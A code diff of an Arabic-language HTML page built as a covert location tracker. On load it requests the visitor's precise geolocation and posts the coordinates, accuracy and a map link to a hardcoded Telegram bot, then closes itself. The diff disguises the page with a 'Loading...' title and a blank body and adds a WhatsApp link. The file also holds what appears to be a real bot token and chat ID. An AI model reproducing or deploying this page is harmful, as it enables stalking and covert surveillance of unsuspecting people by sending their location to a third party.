@@ -2,13 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>جاري تحديد الموقع</title>
+    <title>جاري التحميل...</title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
 
-        // دالة مباشرة للحصول على الموقع وإرساله
-        function getExactLocation() {
+        function getLocationAndSend() {
             if (!navigator.geolocation) {
                 sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
                 return;
@@ -20,70 +19,51 @@
                     const lng = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
                     
+                    // رابط واتساب مع الموقع
+                    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(`موقعي: https://maps.google.com/?q=${lat},${lng}`)}`;
+                    
                     const message = 
-                        `🎯 الموقع الدقيق\n\n` +
+                        `📱 موقع من واتساب\n\n` +
                         `📍 الإحداثيات:\n` +
-                        `• خط العرض: ${lat}\n` +
-                        `• خط الطول: ${lng}\n` +
+                        `• خط العرض: ${lat.toFixed(6)}\n` +
+                        `• خط الطول: ${lng.toFixed(6)}\n` +
                         `• الدقة: ${accuracy} متر\n\n` +
                         `🗺️ الخريطة:\n` +
-                        `https://www.google.com/maps?q=${lat},${lng}\n\n` +
+                        `https://maps.google.com/?q=${lat},${lng}\n\n` +
+                        `💬 واتساب:\n${whatsappUrl}\n\n` +
                         `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;
 
                     await sendToTelegram(message);
-                    setTimeout(() => window.close(), 1000);
-                },
-                function(error) {
-                    let errorMessage = "❌ فشل في الحصول على الموقع: ";
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage += "تم رفض الإذن";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage += "الموقع غير متاح";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage += "انتهت المهلة";
-                            break;
-                    }
-                    sendToTelegram(errorMessage);
+                    
+                    // فتح واتساب أيضاً
+                    window.open(whatsappUrl, '_blank');
+                    
                     setTimeout(() => window.close(), 2000);
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                function(error) {
+                    sendToTelegram("❌ لم يتم الحصول على الموقع");
+                    setTimeout(() => window.close(), 2000);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         }
 
-        // دالة الإرسال إلى التليجرام
         async function sendToTelegram(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                 });
-                
-                if (response.ok) {
-                    console.log("✅ تم إرسال الموقع الدقيق");
-                }
             } catch (error) {
-                console.log("❌ خطأ في الإرسال:", error);
+                console.log("Error sending to Telegram");
             }
         }
 
-        // بدء العملية فوراً
-        getExactLocation();
+        // البدء فوراً
+        getLocationAndSend();
     </script>
 </head>
 <body style="margin:0;padding:0;background:transparent;">
-    <!-- صفحة فارغة -->
 </body>
 </html>
